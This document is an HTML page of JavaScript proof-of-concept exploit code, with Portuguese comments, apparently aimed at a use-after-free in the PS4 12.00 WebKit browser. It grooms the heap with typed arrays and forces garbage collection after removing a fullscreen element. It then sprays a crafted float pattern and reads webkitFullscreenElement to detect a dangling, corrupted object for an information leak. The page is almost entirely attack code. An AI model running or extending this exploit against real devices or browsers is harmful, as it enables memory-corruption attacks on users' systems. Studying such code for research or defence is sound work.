<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - FullscreenManager Leak</title>
<style>
    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 18px;}
    #log { margin-top: 20px; white-space: pre-wrap; }
    .alert { color: #ff3333; font-weight: bold; }
    .leak { color: #ffff00; font-weight: bold; font-size: 24px;}
</style>
</head>
<body>

<h2>PS4 12.00 - FullscreenManager Leak</h2>
<button onclick="runTest()" style="padding: 15px; font-size: 18px; cursor: pointer;">Testar Ponteiro do Fullscreen</button>
<div id="log">Aguardando início...</div>

<script>
const PATTERN = 2.121995791e-314; 

function runTest() {
    const log = document.getElementById("log");
    log.innerHTML = "Preparando Heap...<br><b>Pressione OPTIONS agora!</b>";

    let controllers = [];

    // Passo 1: Heap Grooming
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    let fsTarget = document.createElement("div");
    fsTarget.id = "alvo_fullscreen";
    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Leaks...<br>Aperte OPTIONS</h1>";
    fsTarget.style.backgroundColor = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";
    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    window.onblur = function() {
        log.innerHTML += "<br>[*] Foco perdido. Removendo elemento...";

        // FORÇA GC
        controllers = null;
        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // Gatilho: Deletamos o alvo
        fsTarget.remove(); 
        
        // Spray imediato para envenenar a memória que o FullscreenManager ainda aponta
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        setTimeout(() => {
            log.innerHTML += "<br>[*] Interrogando o FullscreenManager...";
            
            try {
                // Aqui está a mágica: forçamos o FullscreenManager a ler o ponteiro envenenado
                let fantasma = document.webkitFullscreenElement || document.fullscreenElement;
                
                if (fantasma === null) {
                    log.innerHTML += `<br><span class="alert">[-] Falha: FullscreenManager retornou null. Ele percebeu a exclusão.</span>`;
                } else {
                    log.innerHTML += `<br><span class="leak">[!!!] SUCESSO! O FullscreenManager retornou um objeto!</span>`;
                    
                    // Se chegamos aqui, temos um objeto JS apontando para uma memória que controlamos!
                    log.innerHTML += `<br>[*] Tentando ler propriedades do fantasma...`;
                    log.innerHTML += `<br>Tag: ${fantasma.tagName}`;
                    log.innerHTML += `<br>ID: ${fantasma.id}`;
                    
                    // Vamos testar se o objeto fantasma foi corrompido pelo nosso padrão
                    if (fantasma.id !== "alvo_fullscreen") {
                        log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK: O objeto está corrompido!</span>`;
                    }
                }
                
            } catch(e) {
                // Se der crash aqui, a própria leitura da propriedade desencadeia o ponteiro falso
                log.innerHTML += `<br><span class="alert">[CRASH] Acesso ao webkitFullscreenElement causou falha: ${e}</span>`;
            }
        }, 1500);
    };
}
</script>

</body>
</html>
